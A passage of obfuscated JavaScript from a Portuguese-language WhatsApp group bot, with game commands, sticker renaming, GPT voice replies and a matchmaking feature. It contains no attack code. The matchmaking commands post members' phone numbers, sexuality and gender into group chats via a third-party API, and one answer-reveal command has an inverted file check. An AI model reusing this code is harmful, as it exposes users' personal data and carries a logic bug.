                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              const _0x5ac1fb = Math.floor(Math.random() * palavrasANA.length);
              if (_0x40e45c.length == 0) {
                return _0x403602("Use 1 para ativar o jogo do anagrama, ou seja, para desativar utilize o valor numérico 0");
              }
              if (_0x40e45c.join(" ") === "1") {
                if (fs.existsSync("./DADOS/usuarios/grupos/games/anagrama/" + _0x4f1071 + ".json")) {
                  let _0x3a4430 = JSON.parse(fs.readFileSync("./DADOS/usuarios/grupos/games/anagrama/" + _0x4f1071 + ".json"));
                  _0x403602(II + "O jogo já foi iniciado neste grupo!" + II + "\n• Anagrama: " + _0x3a4430.embaralhada + "\n• Dica: " + _0x3a4430.dica);
                } else {
                  fs.writeFileSync("./DADOS/usuarios/grupos/games/anagrama/" + _0x4f1071 + ".json", "" + JSON.stringify(palavrasANA[_0x5ac1fb]));
                  const _0x451c89 = {
                    text: "Decifre a palavra embaralhada abaixo:\n• " + II + "Anagrama:" + II + " " + dataAnagrama2.embaralhada + "\n• " + II + "Dica:" + II + " " + dataAnagrama2.dica
                  };
                  const _0x17227c = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x451c89, _0x17227c);
                }
              } else if (_0x40e45c.join(" ") === "0") {
                if (!fs.existsSync("./DADOS/usuarios/grupos/games/anagrama/" + _0x4f1071 + ".json")) {
                  return _0x403602("Não tem como desativar o jogo do anagrama pôs ele não foi ativado");
                }
                fs.unlinkSync("./DADOS/usuarios/grupos/games/anagrama/" + _0x4f1071 + ".json");
                _0x403602("Desativado com sucesso.");
              }
              break;
            case "quizanimais":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602("Somente adms!");
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              const _0x283173 = Math.floor(Math.random() * quizanimais.length);
              if (_0x40e45c.length == 0) {
                return _0x403602("Use 1 para ativar o quiz animais, ou seja, para desativar utilize o valor numérico 0");
              }
              if (_0x40e45c.join(" ") === "1") {
                if (fs.existsSync("./DADOS/usuarios/grupos/games/quiz-animais/" + _0x4f1071 + ".json")) {
                  superrttrr = JSON.parse(fs.readFileSync("./DADOS/usuarios/grupos/games/quiz-animais/" + _0x4f1071 + ".json"));
                  imagemtexto = "🤔 Qual é o animal apresentado na imagem?\n • Envie sua resposta abaixo, mencionando esta mensagem.";
                  wew = await getBuffer("" + superrttrr.foto);
                  const _0x20cf39 = {
                    image: wew,
                    caption: imagemtexto,
                    thumbnail: wew
                  };
                  const _0x21a642 = {
                    quoted: _0x302296
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x20cf39, _0x21a642);
                } else {
                  fs.writeFileSync("./DADOS/usuarios/grupos/games/quiz-animais/" + _0x4f1071 + ".json", "" + JSON.stringify(quizanimais[_0x283173]));
                  imagemtexto = "🤔 Qual é o animal apresentado na imagem?\n • Envie sua resposta abaixo, mencionando esta mensagem.";
                  wew = await getBuffer("" + quizanimais[_0x283173].foto);
                  const _0x5c4dec = {
                    image: wew,
                    caption: imagemtexto,
                    thumbnail: wew
                  };
                  const _0x17b78b = {
                    quoted: _0x302296
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x5c4dec, _0x17b78b);
                }
              } else if (_0x40e45c.join(" ") === "0") {
                if (!fs.existsSync("./DADOS/usuarios/grupos/games/quiz-animais/" + _0x4f1071 + ".json")) {
                  return _0x403602("Não tem como desativar o jogo pôs ele não foi ativado");
                }
                fs.unlinkSync("./DADOS/usuarios/grupos/games/quiz-animais/" + _0x4f1071 + ".json");
                _0x403602("Desativado com sucesso.");
              }
              break;
            case "qualmusic":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602("Somente adms!");
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              const _0x1714c8 = Math.floor(Math.random() * whatMusicAr.length);
              if (_0x40e45c.length == 0) {
                return _0x403602("Use 1 para ativar o jogo, ou seja, para desativar utilize o valor numérico 0");
              }
              if (_0x40e45c.join(" ") === "1") {
                if (fs.existsSync("./DADOS/usuarios/grupos/games/wmusic/" + _0x4f1071 + ".json")) {
                  dataW = JSON.parse(fs.readFileSync("./DADOS/usuarios/grupos/games/wmusic/" + _0x4f1071 + ".json"));
                  _0x403602("Já existe uma partida iniciada aqui no grupo, confira:\n–\n" + dataW.trechoMusic + "\n–\n🤔😱 Qual música pertence o trecho apresentado acima?\n• " + II + "Dica:" + II + " " + dataW.dica);
                } else {
                  fs.writeFileSync("./DADOS/usuarios/grupos/games/wmusic/" + _0x4f1071 + ".json", "" + JSON.stringify(whatMusicAr[_0x1714c8]));
                  textW = "🎶🎧 𝐖𝐇𝐀𝐓 𝐌𝐔𝐒𝐈𝐂? 😱💡\n–\n" + whatMusicAr[_0x1714c8].trechoMusic + "\n–\n🤔😱 Qual música pertence o trecho apresentado acima?\n• " + II + "Dica:" + II + " " + whatMusicAr[_0x1714c8].dica;
                  const _0x51703a = {
                    text: textW
                  };
                  const _0x176efd = {
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x4f1071, _0x51703a, _0x176efd);
                }
              } else if (_0x40e45c.join(" ") === "0") {
                if (!fs.existsSync("./DADOS/usuarios/grupos/games/wmusic/" + _0x4f1071 + ".json")) {
                  return _0x403602("Não tem como desativar o jogo, pois ele não foi ativado");
                }
                fs.unlinkSync("./DADOS/usuarios/grupos/games/wmusic/" + _0x4f1071 + ".json");
                _0x403602("Desativado com sucesso.");
              }
              break;
            case "gartic":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602("Somente adms!");
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              const _0x3c9efa = Math.floor(Math.random() * garticArchives.length);
              if (_0x40e45c.length == 0) {
                return _0x403602("Use 1 para ativar o gartic, ou seja, para desativar utilize o valor numérico 0");
              }
              if (_0x40e45c.join(" ") === "1") {
                if (fs.existsSync("./DADOS/usuarios/grupos/games/gartic/" + _0x4f1071 + ".json")) {
                  dataGartic2 = JSON.parse(fs.readFileSync("./DADOS/usuarios/grupos/games/gartic/" + _0x4f1071 + ".json"));
                  imagemtexto = "👩🏼‍🏫 - A resposta é representada por um(a): " + dataGartic2.pergunta + "\n📜 - A resposta supostamente começa com a(s) letra(s): \"" + dataGartic2.letra_inicial + "\"\n🤔 - Hmmm, contém traços? " + dataGartic2.contem_traços + "\n–\n❓️ - *Não sabe a resposta?* _Peça ao adm do grupo para usar o comando *" + _0x1d93be + "revelargartic* para revelar a resposta correta da afirmação._";
                  wew = await getBuffer("" + dataGartic2.imagem);
                  const _0x4ff1c9 = {
                    image: wew,
                    caption: imagemtexto,
                    thumbnail: wew
                  };
                  const _0x3b0fb0 = {
                    quoted: _0x302296
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x4ff1c9, _0x3b0fb0);
                } else {
                  fs.writeFileSync("./DADOS/usuarios/grupos/games/gartic/" + _0x4f1071 + ".json", "" + JSON.stringify(garticArchives[_0x3c9efa]));
                  imagemtexto = "👩🏼‍🏫 - A resposta é representada por um(a): " + garticArchives[_0x3c9efa].pergunta + "\n📜 - A resposta supostamente começa com a(s) letra(s): \"" + garticArchives[_0x3c9efa].letra_inicial + "\"\n🤔 - Hmmm, contém traços? " + garticArchives[_0x3c9efa].contem_traços + "\n–\n❓️ - *Não sabe a resposta?* _Peça ao adm do grupo para usar o comando *" + _0x1d93be + "revelargartic* para revelar a resposta correta da afirmação._";
                  wew = await getBuffer("" + garticArchives[_0x3c9efa].imagem);
                  const _0x10fbf4 = {
                    image: wew,
                    caption: imagemtexto,
                    thumbnail: wew
                  };
                  const _0x596ab6 = {
                    quoted: _0x302296
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x10fbf4, _0x596ab6);
                }
              } else if (_0x40e45c.join(" ") === "0") {
                if (!fs.existsSync("./DADOS/usuarios/grupos/games/gartic/" + _0x4f1071 + ".json")) {
                  return _0x403602("Não tem como desativar o gartic pôs ele não foi ativado.");
                }
                fs.unlinkSync("./DADOS/usuarios/grupos/games/gartic/" + _0x4f1071 + ".json");
                _0x403602("Desativado com sucesso.");
              }
              break;
            case "enigma":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602("Somente adms!");
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              const _0x85a272 = Math.floor(Math.random() * enigmaArchive.length);
              if (_0x40e45c.length == 0) {
                return _0x403602("Use 1 para ativar o enigma, ou seja, para desativar utilize o valor numérico 0");
              }
              if (_0x40e45c.join(" ") === "1") {
                if (fs.existsSync("./DADOS/usuarios/grupos/games/enigma/" + _0x4f1071 + ".json")) {
                  SAB_SAB_ENI = JSON.parse(fs.readFileSync("./DADOS/usuarios/grupos/games/enigma/" + _0x4f1071 + ".json"));
                  imagemtexto = "📜 - Resolva o seguinte enigma abaixo:\n\n" + SAB_SAB_ENI.charada + "\n\n❓️ - *Não sabe a resposta?* _Peça ao adm do grupo para usar o comando *" + _0x1d93be + "revelarenigma* para revelar a resposta correta da enigma._";
                  wew = await getBuffer("https://telegra.ph/file/15be608763684b3e3af38.jpg");
                  const _0xe876b0 = {
                    image: wew,
                    caption: imagemtexto,
                    thumbnail: wew
                  };
                  const _0xb523d1 = {
                    quoted: _0x302296
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0xe876b0, _0xb523d1);
                } else {
                  fs.writeFileSync("./DADOS/usuarios/grupos/games/enigma/" + _0x4f1071 + ".json", "" + JSON.stringify(enigmaArchive[_0x85a272]));
                  imagemtexto = "📜 - Resolva o seguinte enigma abaixo:\n\n" + enigmaArchive[_0x85a272].charada + "\n\n❓️ - *Não sabe a resposta?* _Peça ao adm do grupo para usar o comando *" + _0x1d93be + "revelarenigma* para revelar a resposta correta da enigma._";
                  wew = await getBuffer("https://telegra.ph/file/15be608763684b3e3af38.jpg");
                  const _0x47448a = {
                    image: wew,
                    caption: imagemtexto,
                    thumbnail: wew
                  };
                  const _0x1351ac = {
                    quoted: _0x302296
                  };
                  await _0x263319.sendMessage(_0x4f1071, _0x47448a, _0x1351ac);
                }
              } else if (_0x40e45c.join(" ") === "0") {
                if (!fs.existsSync("./DADOS/usuarios/grupos/games/enigma/" + _0x4f1071 + ".json")) {
                  return _0x403602("Não tem como desativar o enigma pôs ele não foi ativado.");
                }
                fs.unlinkSync("./DADOS/usuarios/grupos/games/enigma/" + _0x4f1071 + ".json");
                _0x403602("Desativado com sucesso.");
              }
              break;
            case "revelargartic":
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602("Somente adms podem ver a(s) resposta(s) do jogos!");
              }
              if (fs.existsSync("./DADOS/usuarios/grupos/games/gartic/" + _0x4f1071 + ".json")) {
                return "Não existe nenhuma partida atual do jogo neste grupo.";
              }
              let _0x490b2a = JSON.parse(fs.readFileSync("./DADOS/usuarios/grupos/games/gartic/" + _0x4f1071 + ".json"));
              _0x403602("• Olá *" + _0x55a6ac + "*, a resposta correta da afirmação era: " + II + _0x490b2a.resposta + II + "\n• Envie a resposta apresentada acima para passar a próxima..");
              break;
            case "revelarenigma":
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602("Somente adms podem ver a(s) resposta(s) do jogos!");
              }
              if (!fs.existsSync("./DADOS/usuarios/grupos/games/enigma/" + _0x4f1071 + ".json")) {
                return _0x403602("Não existe nenhuma partida atual do jogo neste grupo.");
              }
              let _0x4ab3ed = JSON.parse(fs.readFileSync("./DADOS/usuarios/grupos/games/enigma/" + _0x4f1071 + ".json"));
              _0x403602("• Olá *" + _0x55a6ac + "*, a resposta correta do enigma era: " + _0x4ab3ed.respostaEne + "\n• Envie a resposta apresentada acima para passar a próxima..");
              break;
            case "vab":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              psycatgames().then(async _0x414f0d => {
                const {
                  nsfw: _0x301f56,
                  questions: _0x53b478
                } = _0x414f0d[Math.floor(Math.random() * _0x414f0d.length)];
                const {
                  pergunta1: _0x45edfb,
                  pergunta2: _0x1e2041
                } = _0x53b478[Math.floor(Math.random() * _0x53b478.length)];
                sendPoll(_0x263319, _0x4f1071, "Você prefere..", [_0x45edfb, _0x1e2041]);
              }).catch(console.error);
              break;
            case "eununca":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              setTimeout(() => {
                _0x1b86ad(_0x4f1071, "🙈");
              }, 100);
              const _0x5c1da3 = JSON.parse(fs.readFileSync("./DADOS/eununca.json"));
              const _0xd909fc = _0x5c1da3[Math.floor(Math.random() * _0x5c1da3.length)];
              sendPoll(_0x263319, _0x4f1071, _0xd909fc, ["Eu nunca", "Eu já"]).catch(console.error);
              break;
            case "take":
              if (!_0x1785a1) {
                return _0x403602("Você usou de forma errada... Marque uma figurinha.");
              }
              try {
                const _0x1d8420 = rgtake.map(_0x45edbc => _0x45edbc.usuario).indexOf(_0x32e455);
                if (_0x1d8420 < 0) {
                  return _0x403602("Você ainda não definiu a sua marca d'água personalizada para o uso desse comando.\n• Por favor, use o comando *" + _0x1d93be + "rgtake bot/bot* para registrar sua marca d'água personalizada para seus stickers.");
                }
                const _0x40992c = await getFileBuffer(_0x302296.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, "sticker");
                const _0xb94fe2 = "data:image/jpeg;base64," + _0x40992c.toString("base64");
                const _0x289e02 = new Sticker();
                _0x289e02.addFile(_0x40992c);
                const _0x458335 = {
                  pack: "" + rgtake[_0x1d8420].mcdagua1,
                  author: "" + rgtake[_0x1d8420].mcdagua2,
                  emojis: ["🤠"]
                };
                _0x289e02.options.metadata = _0x458335;
                const _0x97f593 = await _0x289e02.start();
                const _0x26b93e = {
                  quoted: _0x302296
                };
                await _0x263319.sendMessage(_0x4f1071, {
                  sticker: fs.readFileSync(_0x97f593[0].value),
                  contextInfo: {
                    externalAdReply: {
                      title: "Renomeado com sucesso para: " + rgtake[_0x1d8420].mcdagua1 + "|" + rgtake[_0x1d8420].mcdagua2,
                      body: "",
                      previewType: "PHOTO",
                      thumbnail: fs.readFileSync(_0x97f593[0].value)
                    }
                  }
                }, _0x26b93e);
                setTimeout(() => {
                  fs.unlinkSync(_0x97f593[0].value);
                }, 1000);
              } catch (_0x58f29d) {
                console.error(_0x58f29d);
                _0x403602("Erro ao renomear a figurinha, tente novamente mais tarde.");
              }
              break;
            case "rgtake":
              var [_0x11456a, _0x359c2d] = _0x1d6557.split("/");
              rgtakergtake = [];
              for (_0xc3d45a of rgtake) {
                rgtakergtake.push(_0xc3d45a.usuario);
              }
              if (rgtakergtake.indexOf(_0x32e455) >= 0) {
                return _0x403602("Você já registrou sua marca ďagua, não é possível usar esse comando novamente.");
              }
              if (!_0x1d6557.includes("/")) {
                return _0x403602("Você usou de forma errada, siga o exemplo: *" + (_0x1d93be + _0x3dec88) + " Jeff/bot*");
              }
              if (!_0x11456a) {
                return _0x403602("Você esqueceu de preencher o primeiro campo... Ex: *" + (_0x1d93be + _0x3dec88) + " sb|bot*");
              }
              if (!_0x359c2d) {
                return _0x403602("Você esqueceu de preencher o segundo campo... Ex: *" + (_0x1d93be + _0x3dec88) + " xbot/bot*");
              }
              const _0x142c39 = {
                usuario: _0x32e455,
                mcdagua1: _0x11456a,
                mcdagua2: _0x359c2d
              };
              rgtake.push(_0x142c39);
              fs.writeFileSync("./DADOS/usuarios/take.json", JSON.stringify(rgtake, null, 2));
              _0x403602("Sucesso ao concluir o registro... Agora você pode usar o comando: *" + _0x1d93be + "take*");
              break;
            case "rntake":
              _0x4893dc = rgtake.map(_0x53168e => _0x53168e.usuario).indexOf(_0x32e455);
              if (_0x4893dc < 0) {
                return _0x403602("Como você quer renomear algo que você não tem registro?");
              }
              if (!_0x1d6557.includes("/")) {
                return _0x403602("Você usou de forma errada, siga o exemplo: *" + (_0x1d93be + _0x3dec88) + " bot/jeff*");
              }
              var [_0x459503, _0x399f6f] = _0x1d6557.split("/");
              if (!_0x459503) {
                return _0x403602("Você esqueceu de preencher o primeiro campo... Ex: *" + (_0x1d93be + _0x3dec88) + " sb|bot*");
              }
              if (!_0x399f6f) {
                return _0x403602("Você esqueceu de preencher o segundo campo... Ex: *" + (_0x1d93be + _0x3dec88) + " sb|bot*");
              }
              rgtake[_0x4893dc].mcdagua1 = _0x459503;
              rgtake[_0x4893dc].mcdagua2 = _0x399f6f;
              fs.writeFileSync("./DADOS/usuarios/take.json", JSON.stringify(rgtake, null, 2) + "\n");
              _0x403602("Sua marca ďágua foi alterada para *\"" + _0x459503 + "|" + _0x399f6f + "\"* com sucesso.");
              break;
            case "rgtinder":
              try {
                ABC = await fetchJson(SITE_JEFF_APIS + "/s/tinder/login?usu=" + _0x32e455 + "&" + (_0x1d6557 && !_0x10f925 ? "rg=" + _0x1d6557 + "&" : "") + "apikey=" + _0x512d5e);
                try {
                  _0x105f0a = await fetchJson(SITE_JEFF_APIS + "/s/tinder/perfil?usu=" + _0x32e455 + "&apikey=" + _0x512d5e);
                } catch {
                  return _0x403602("Erro ao tentar acessar o seu registro em meu banco!");
                }
                fini = _0x105f0a.nome != 0 && _0x105f0a.idade != 0 && _0x105f0a.gene != 0 && _0x105f0a.sexualidade != 0 && _0x105f0a.filtro != 0 && _0x105f0a.bio != 0 && _0x105f0a.foto == 0;
                if (fini && _0x10f925) {
                  try {
                    _0xbbe906 = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                    owgi = await getFileBuffer(_0xbbe906, "image");
                    img = await upload(owgi);
                    BCD = await fetchJson(SITE_JEFF_APIS + "/s/tinder/login?usu=" + _0x32e455 + "&rg=" + img + "&apikey=" + _0x512d5e);
                    return _0x403602(_0x256180(BCD.message));
                  } catch {
                    return _0x403602("Não foi possível salvar a imagem. Tente novamente!");
                  }
                }
                _0x403602(_0x256180(ABC.message));
              } catch (_0x3e2c47) {
                console.log(_0x3e2c47);
                _0x403602("Erro.");
              }
              break;
            case "tinder":
            case "rolar":
              _0x1b86ad(_0x4f1071, "🔥");
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              try {
                ABC = await fetchJson(SITE_JEFF_APIS + "/s/tinder/find?usu=" + _0x32e455 + "&apikey=" + _0x512d5e);
                _0x105f0a = await fetchJson(SITE_JEFF_APIS + "/s/tinder/perfil?usu=" + _0x32e455 + "&apikey=" + _0x512d5e);
                txt = "*" + NomeDoBot + " Tinder 👫🌟* - Seu bot e também seu cupido agora hahaha!\n—\n• [👤] Nome do Usuário: " + ABC.dados[0].nome + "\n• WhatsApp: wa.me/" + ABC.dados[0].nmr + "\n• [⏳] Idade: " + ABC.dados[0].idade + " anos.\n• [🏳‍🌈] Sexualidade: " + ABC.dados[0].sexualidade + "\n• [🚻] Gênero: " + ABC.dados[0].gene + "\n• [📍] Filtro: " + (ABC.dados[0].filtro == 3 ? "O usuário não contém nenhum tipo de preferência, será que ele é bissexual?" : "O usuário busca por " + (ABC.dados[0].filtro == 1 ? "homens" : "mulheres")) + "\n—\n• [💌] *Biografia:* " + ABC.dados[0].bio + "\n—\nExibindo perfil Nº" + ABC.dados[0].id + " de " + ABC.dados[0].total + " usuário" + (ABC.dados[0].total > 1 ? "s" : "") + " registrado" + (ABC.dados[0].total > 1 ? "s" : "") + ".";
                const _0x3b287a = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, {
                  image: {
                    url: SITE_JEFF_APIS + "/api/canvas/ship?foto1=" + _0x105f0a.dados[0].foto + "&foto2=" + ABC.dados[0].foto + "&mat=" + Math.floor(Math.random() * 100) + "&fundo=https://telegra.ph/file/b41f8e7f2ca966c8a6667.jpg"
                  },
                  caption: txt
                }, _0x3b287a);
              } catch (_0x2d4fbd) {
                console.log(_0x2d4fbd);
                _0x403602(_0x256180(ABC.message || "Erro."));
              }
              break;
            case "tindernome":
            case "tinderidade":
            case "tinderbio":
            case "setgene":
            case "setsex":
            case "setfiltro":
            case "tinderfoto":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              try {
                ABC = await fetchJson(SITE_JEFF_APIS + "/s/tinder/config?usu=" + _0x32e455 + "&mod=" + _0x3dec88 + "&" + (_0x1d6557 && !_0x10f925 ? "q=" + _0x1d6557 + "&" : "") + "apikey=" + _0x512d5e);
                if (_0x3dec88 == "tinderfoto" && _0x10f925) {
                  try {
                    _0xbbe906 = _0x10f925 ? JSON.parse(JSON.stringify(_0x302296).replace("quotedM", "m")).message.extendedTextMessage.contextInfo.message.imageMessage : _0x302296.message.imageMessage;
                    owgi = await getFileBuffer(_0xbbe906, "image");
                    img = await upload(owgi);
                    BCD = await fetchJson(SITE_JEFF_APIS + "/s/tinder/config?usu=" + _0x32e455 + "&mod=" + _0x3dec88 + "&q=" + img + "&apikey=" + _0x512d5e);
                    return _0x403602(_0x256180(BCD.message));
                  } catch {
                    return _0x403602("Não foi possível salvar a imagem. Tente novamente!");
                  }
                }
                _0x403602(_0x256180(ABC.message));
              } catch {
                _0x403602("Erro.");
              }
              break;
            case "meutinder":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              try {
                ABC = await fetchJson(SITE_JEFF_APIS + "/s/tinder/perfil?usu=" + _0x32e455 + "&apikey=" + _0x512d5e);
                envMyTinder = "• " + (ABC.dados[0].gene.replace("ã", "a") == "nao declarar" ? "• [👤] Nome" : "• [👤] Usuári" + (ABC.dados[0].gene == "masculino" ? "o" : "a")) + ": " + ABC.dados[0].nome + "\n• [⏳] Idade: " + ABC.dados[0].idade + " anos.\n• [📞] WhatsApp: wa.me/" + ABC.dados[0].nmr + "\n• [🏳️‍🌈] Sexualidade: " + ABC.dados[0].sexualidade + "\n• [🚻] Gênero: " + ABC.dados[0].gene + "\n• [📍] Filtro: " + (ABC.dados[0].filtro == 3 ? "O usuário não contém nenhum tipo de preferência." : "O usuário busca por " + (ABC.dados[0].filtro == 1 ? "homens" : "mulheres")) + "\n—\n• [😺] Biografia: " + ABC.dados[0].bio + "\n—\n" + (ABC.dados[0].gene.replace("ã", "a") == "nao declarar" ? "Deu entrada no tinder" : "Registrad" + (ABC.dados[0].gene == "masculino" ? "o" : "a")) + " em " + ABC.dados[0].registro[0] + ", às " + ABC.dados[0].registro[1] + ".";
                const _0x1400ba = {
                  quoted: _0x302296
                };
                _0x263319.sendMessage(_0x4f1071, {
                  text: envMyTinder,
                  contextInfo: {
                    externalAdReply: {
                      title: "Página de Registro | " + NomeDoBot + " Tinder💘👫",
                      body: "😌🌟 Não sou o Tinder verdadeiro, mas já arrumei tanto(a) namorado(a) para vocês que hoje eu tô encalhado!",
                      thumbnail: await getBuffer("" + ABC.dados[0].foto),
                      mediaType: 1,
                      showAdAttribution: true,
                      sourceUrl: SITE_JEFF_APIS + "/"
                    }
                  }
                }, _0x1400ba);
              } catch {
                _0x403602(_0x256180(ABC.message || "Erro."));
              }
              break;
            case "sairtinder":
            case "rmtinder":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              if (_0x3dec88 == "rmtinder") {
                if (!_0x2a5ff3) {
                  return _0x403602(_0x7e2f25);
                }
                if (!_0x1d6557 && !_0x1dcf0a) {
                  return _0x403602("Retorne após o comando o número ou @ do usuário que você quer deletar do tinder.");
                }
                deletar = _0x5a6ff4(_0x1d6557);
              } else {
                deletar = _0x32e455;
              }
              try {
                ABC = await fetchJson(SITE_JEFF_APIS + "/s/tinder/delete?usu=" + deletar + "&apikey=" + _0x512d5e);
                _0x403602(_0x256180(ABC.message));
              } catch {
                _0x403602("Erro.");
              }
              break;
            case "gptbkvoz":
              try {
                const _0x37416a = require("./armor/funcoes/gtts")("pt-br");
                if (!_0x1d6557) {
                  return _0x403602("Faça uma pergunta, exemplo:\n\n*" + (_0x1d93be + _0x3dec88) + " Quantos anos para o plástico se decompor.*");
                }
                setTimeout(async () => {
                  await _0x263319.sendPresenceUpdate("recording", _0x4f1071);
                }, 3000);
                _0x403602("Aguarde, criando / pesquisando sobre o que está perguntando ou pedindo.");
                const _0x1ffd25 = await fetchJson(SITE_JEFF_APIS + "/api/ia/gpt-blackbox?query=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x429e44 = _0x1ffd25.resultado ? _0x1ffd25.resultado : "Erro ao obter resposta da API.";
                const _0x296a7c = await fetchJson(SITE_JEFF_APIS + "/api/info/translate?ling=pt&texto=" + _0x429e44 + "&apikey=" + _0x512d5e);
                const _0x2255c1 = _0x296a7c.result ? _0x296a7c.result : "Erro ao traduzir resposta.";
                const _0x59ff32 = getRandom(".mp3");
                const _0x4a7b41 = getRandom(".ogg");
                _0x37416a.save(_0x59ff32, _0x2255c1, async () => {
                  exec("ffmpeg -i " + _0x59ff32 + " -ar 48000 -vn -c:a libopus " + _0x4a7b41, async _0x3e6e1b => {
                    fs.unlinkSync(_0x59ff32);
                    if (_0x3e6e1b) {
                      return _0x403602("Houve um erro no processamento da sua solicitação. Tente novamente mais tarde e talvez, quem sabe, eu possa atender ao seu desejo.");
                    }
                    const _0x44776d = {
                      quoted: _0x302296
                    };
                    await _0x263319.sendMessage(_0x4f1071, {
                      audio: fs.readFileSync(_0x4a7b41),
                      mimetype: "audio/mp4",
                      ptt: true
                    }, _0x44776d);
                    fs.unlinkSync(_0x4a7b41);
                  });
                });
              } catch (_0x20a08c) {}
              break;
            case "gpt4voz":
              try {
                const _0x206465 = require("./armor/funcoes/gtts")("pt-br");
                if (!_0x1d6557) {
                  return _0x403602("Faça uma pergunta, exemplo:\n\n*" + (_0x1d93be + _0x3dec88) + " Quantos anos para o plástico se decompor.*");
                }
                setTimeout(async () => {
                  await _0x263319.sendPresenceUpdate("recording", _0x4f1071);
                }, 3000);
                _0x403602("Aguarde, criando / pesquisando sobre o que está perguntando ou pedindo.");
                const _0x4f1f29 = await fetchJson(SITE_JEFF_APIS + "/api/ia/gpt-4?query=" + encodeURIComponent(_0x1d6557) + "&apikey=" + _0x512d5e);
                const _0x47a102 = _0x4f1f29.resultado ? _0x4f1f29.resultado : "Erro ao obter resposta da API.";
                const _0x4a7449 = getRandom(".mp3");
                const _0x41e154 = getRandom(".ogg");
                _0x206465.save(_0x4a7449, _0x47a102, async () => {
                  exec("ffmpeg -i " + _0x4a7449 + " -ar 48000 -vn -c:a libopus " + _0x41e154, async _0xaff24e => {
                    fs.unlinkSync(_0x4a7449);
                    if (_0xaff24e) {
                      return _0x403602("Houve um erro no processamento da sua solicitação. Tente novamente mais tarde e talvez, quem sabe, eu possa atender ao seu desejo.");
                    }
                    const _0x15580a = {
                      quoted: _0x302296
                    };
                    await _0x263319.sendMessage(_0x4f1071, {
                      audio: fs.readFileSync(_0x41e154),
                      mimetype: "audio/mp4",
                      ptt: true
                    }, _0x15580a);
                    fs.unlinkSync(_0x41e154);
                  });
                });
              } catch (_0x5ddd96) {}
              break;
            case "autofigupv":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x1d6557) {
                _0x403602("Por favor, forneça um valor numérico (0 para desativar, 1 para ativar) para configurar a opção \"autofigu\".");
                return;
              }
              const _0x56772b = parseInt(_0x1d6557);
              if (_0x56772b !== 0 && _0x56772b !== 1) {
                _0x403602("Por favor, forneça apenas 0 para desativar ou 1 para ativar a opção \"autofigu\".");
                return;
              }
              const _0x51e97d = require("./DADOS/Dono/settings.json");
              _0x51e97d.autofigu = _0x56772b === 1;
              fs.writeFileSync("./DADOS/Dono/settings.json", JSON.stringify(_0x51e97d, null, 2));
              _0x403602("\"autofigupv\" " + (_0x56772b === 1 ? "ativado✅" : "desativada❌") + " com Sucesso.");
              break;
            case "boleto":
              try {
                let _0x196616;
                const _0x2b2cd0 = _0x302296.mentionedJid;
